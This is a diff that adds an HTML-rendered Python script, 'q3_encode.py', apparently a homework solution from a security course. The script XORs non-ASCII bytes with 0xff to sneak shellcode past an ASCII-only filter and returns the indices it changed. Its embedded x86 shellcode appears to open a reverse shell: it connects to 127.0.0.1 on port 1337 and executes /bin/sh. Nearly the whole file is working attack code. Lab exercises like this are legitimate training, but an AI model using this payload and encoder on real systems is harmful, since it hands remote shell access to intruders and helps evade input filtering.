@@ -1,0 +1,77 @@
+<html>
+<head>
+<title>q3_encode.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); font-weight: bold; }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(204,120,50); }
+.s3 { color: rgb(165,194,97); }
+.s4 { color: rgb(104,151,187); }
+.s5 { color: rgb(98,151,85); font-style: italic; }
+.s6 { color: rgb(128,128,128); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q3_encode.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">import </span><span class="s1">functools</span><span class="s2">, </span><span class="s1">os</span><span class="s2">, </span><span class="s1">socket</span><span class="s2">, </span><span class="s1">traceback</span><span class="s2">, </span><span class="s1">struct 
+<a name="l2"><span class="ln">2    </span></a> 
+<a name="l3"><span class="ln">3    </span></a> 
+<a name="l4"><span class="ln">4    </span></a>HOST        = </span><span class="s3">'127.0.0.1'</span><span class="s1"> 
+<a name="l5"><span class="ln">5    </span></a>SERVER_PORT = </span><span class="s4">8000</span><span class="s1"> 
+<a name="l6"><span class="ln">6    </span></a>LOCAL_PORT  = </span><span class="s4">1337</span><span class="s1"> 
+<a name="l7"><span class="ln">7    </span></a> 
+<a name="l8"><span class="ln">8    </span></a> 
+<a name="l9"><span class="ln">9    </span></a>ASCII_MAX = </span><span class="s4">0x7f</span><span class="s1"> 
+<a name="l10"><span class="ln">10   </span></a> 
+<a name="l11"><span class="ln">11   </span></a> 
+<a name="l12"><span class="ln">12   </span></a></span><span class="s0">def </span><span class="s1">warn_invalid_ascii(selector=None): 
+<a name="l13"><span class="ln">13   </span></a>    selector = selector </span><span class="s0">or </span><span class="s1">(</span><span class="s0">lambda </span><span class="s1">x: x) 
+<a name="l14"><span class="ln">14   </span></a>    </span><span class="s0">def </span><span class="s1">decorator(func): 
+<a name="l15"><span class="ln">15   </span></a>        @functools.wraps(func) 
+<a name="l16"><span class="ln">16   </span></a>        </span><span class="s0">def </span><span class="s1">result(*args</span><span class="s2">, </span><span class="s1">**kwargs): 
+<a name="l17"><span class="ln">17   </span></a>            ret = func(*args</span><span class="s2">, </span><span class="s1">**kwargs) 
+<a name="l18"><span class="ln">18   </span></a>            </span><span class="s0">if </span><span class="s1">any(ord(c) &gt; ASCII_MAX </span><span class="s0">for </span><span class="s1">c </span><span class="s0">in </span><span class="s1">selector(ret)): 
+<a name="l19"><span class="ln">19   </span></a>                </span><span class="s0">print</span><span class="s1">(</span><span class="s3">'WARNING: Non ASCII chars in return value from %s at</span><span class="s2">\n</span><span class="s3">%s'</span><span class="s1"> 
+<a name="l20"><span class="ln">20   </span></a>                      % (func.__name__</span><span class="s2">, </span><span class="s3">''</span><span class="s1">.join(traceback.format_stack()[:-</span><span class="s4">1</span><span class="s1">]))) 
+<a name="l21"><span class="ln">21   </span></a>            </span><span class="s0">return </span><span class="s1">ret 
+<a name="l22"><span class="ln">22   </span></a>        </span><span class="s0">return </span><span class="s1">result 
+<a name="l23"><span class="ln">23   </span></a>    </span><span class="s0">return </span><span class="s1">decorator 
+<a name="l24"><span class="ln">24   </span></a> 
+<a name="l25"><span class="ln">25   </span></a></span><span class="s0">def </span><span class="s1">encode(data): 
+<a name="l26"><span class="ln">26   </span></a>    </span><span class="s5">'''Encode data to be valid ASCII, by XOR-ing non ASCII bytes with 0xff. 
+<a name="l27"><span class="ln">27   </span></a> 
+<a name="l28"><span class="ln">28   </span></a>    Return the encoded data and the indices that were XOR-ed. 
+<a name="l29"><span class="ln">29   </span></a>    - To return multiple values, do `return a, b` 
+<a name="l30"><span class="ln">30   </span></a>    - To get multiple returned values do `a, b = encode(data)` 
+<a name="l31"><span class="ln">31   </span></a>    '''</span><span class="s1"> 
+<a name="l32"><span class="ln">32   </span></a>    </span><span class="s6"># TODO: IMPLEMENT THIS FUNCTION</span><span class="s1"> 
+<a name="l33"><span class="ln">33   </span></a>    xor_indces = [] 
+<a name="l34"><span class="ln">34   </span></a>    new_shellcode = </span><span class="s3">&quot;&quot;</span><span class="s1"> 
+<a name="l35"><span class="ln">35   </span></a>    ascii_xor = </span><span class="s4">0xff</span><span class="s1"> 
+<a name="l36"><span class="ln">36   </span></a>    </span><span class="s0">for </span><span class="s1">i </span><span class="s0">in </span><span class="s1">range(len(data)): 
+<a name="l37"><span class="ln">37   </span></a>        code_byte = struct.unpack(</span><span class="s3">&quot;B&quot;</span><span class="s2">, </span><span class="s1">data[i])[</span><span class="s4">0</span><span class="s1">] </span><span class="s6"># convert to unsigned byte numeric type</span><span class="s1"> 
+<a name="l38"><span class="ln">38   </span></a>        </span><span class="s0">if </span><span class="s1">code_byte &gt; ASCII_MAX: 
+<a name="l39"><span class="ln">39   </span></a>            code_byte ^= ascii_xor </span><span class="s6"># xor with 0xff</span><span class="s1"> 
+<a name="l40"><span class="ln">40   </span></a>            code_byte = struct.pack(</span><span class="s3">&quot;B&quot;</span><span class="s2">, </span><span class="s1">code_byte) </span><span class="s6"># pack again to unsigned byte</span><span class="s1"> 
+<a name="l41"><span class="ln">41   </span></a>            new_shellcode += code_byte </span><span class="s6"># append to new shellcode</span><span class="s1"> 
+<a name="l42"><span class="ln">42   </span></a>            xor_indces.append(i) </span><span class="s6"># mark index that was xor'ed</span><span class="s1"> 
+<a name="l43"><span class="ln">43   </span></a>        </span><span class="s0">else</span><span class="s1">: 
+<a name="l44"><span class="ln">44   </span></a>            new_shellcode += data[i] </span><span class="s6"># else, don't change index</span><span class="s1"> 
+<a name="l45"><span class="ln">45   </span></a> 
+<a name="l46"><span class="ln">46   </span></a>    </span><span class="s0">return </span><span class="s1">new_shellcode</span><span class="s2">, </span><span class="s1">xor_indces 
+<a name="l47"><span class="ln">47   </span></a> 
+<a name="l48"><span class="ln">48   </span></a>old_shellcode = </span><span class="s3">'U</span><span class="s2">\x89\xe5\x83\xec</span><span class="s3">$</span><span class="s2">\xc7</span><span class="s3">E</span><span class="s2">\xe4\x00\x00\x00\x00\xc7</span><span class="s3">E</span><span class="s2">\xe8\x00\x00\x00\x00\xc7</span><span class="s3">E</span><span class="s2">\xec\x00\x00\x00\x00\xc7</span><span class="s3">E</span><span class="s2">\xf0\x00\x00\x00\x00\x83\xec\x04</span><span class="s3">j</span><span class="s2">\x00</span><span class="s3">j</span><span class="s2">\x01</span><span class="s3">j</span><span class="s2">\x02\xba</span><span class="s3">0</span><span class="s2">\x87\x04\x08\xff\xd2\x83\xc4\x10\x89</span><span class="s3">E</span><span class="s2">\xf4</span><span class="s3">f</span><span class="s2">\xc7</span><span class="s3">E</span><span class="s2">\xe4\x02\x00\x83\xec\x0c</span><span class="s3">h9</span><span class="s2">\x05\x00\x00\xba</span><span class="s3">@</span><span class="s2">\x86\x04\x08\xff\xd2\x83\xc4\x10</span><span class="s3">f</span><span class="s2">\x89</span><span class="s3">E</span><span class="s2">\xe6\x83\xec\x0c\xeb</span><span class="s3">p</span><span class="s2">\xba</span><span class="s3">@</span><span class="s2">\x87\x04\x08\xff\xd2\x83\xc4\x10\x89</span><span class="s3">E</span><span class="s2">\xe8\x83\xec\x04</span><span class="s3">j</span><span class="s2">\x10\x8d</span><span class="s3">E</span><span class="s2">\xe4</span><span class="s3">P</span><span class="s2">\xff</span><span class="s3">u</span><span class="s2">\xf4\xba</span><span class="s3">P</span><span class="s2">\x87\x04\x08\xff\xd2\x83\xc4\x10\x83\xec\x08</span><span class="s3">j</span><span class="s2">\x00\xff</span><span class="s3">u</span><span class="s2">\xf4\xba\x00\x86\x04\x08\xff\xd2\x83\xc4\x10\x83\xec\x08</span><span class="s3">j</span><span class="s2">\x01\xff</span><span class="s3">u</span><span class="s2">\xf4\xba\x00\x86\x04\x08\xff\xd2\x83\xc4\x10\x83\xec\x08</span><span class="s3">j</span><span class="s2">\x02\xff</span><span class="s3">u</span><span class="s2">\xf4\xba\x00\x86\x04\x08\xff\xd2\x83\xc4\x10\xc7</span><span class="s3">E</span><span class="s2">\xe0\x00\x00\x00\x00\x83\xec\x08\x8d</span><span class="s3">E</span><span class="s2">\xe0</span><span class="s3">P</span><span class="s2">\xeb\x16\xba\xd0\x86\x04\x08\xff\xd2\xe8\x8b\xff\xff\xff</span><span class="s3">127.0.0.1</span><span class="s2">\x00\xe8\xe5\xff\xff\xff</span><span class="s3">/bin/sh</span><span class="s2">\x00</span><span class="s3">'</span><span class="s1"> 
+<a name="l49"><span class="ln">49   </span></a> 
+<a name="l50"><span class="ln">50   </span></a>shell</span><span class="s2">, </span><span class="s1">arr = encode(old_shellcode) 
+<a name="l51"><span class="ln">51   </span></a></span><span class="s0">print </span><span class="s1">shell 
+<a name="l52"><span class="ln">52   </span></a></span><span class="s0">print </span><span class="s1">arr 
+<a name="l53"><span class="ln">53   </span></a></span></pre>
+</body>
+</html>
